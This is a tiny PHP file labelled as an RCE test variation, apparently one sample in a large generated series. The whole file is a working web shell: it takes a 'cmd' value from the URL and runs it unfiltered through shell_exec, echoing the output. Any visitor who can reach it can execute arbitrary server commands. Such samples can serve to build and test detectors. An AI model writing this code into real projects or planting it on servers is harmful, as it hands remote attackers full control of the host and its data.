<?php
// RCE test variation #1131
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>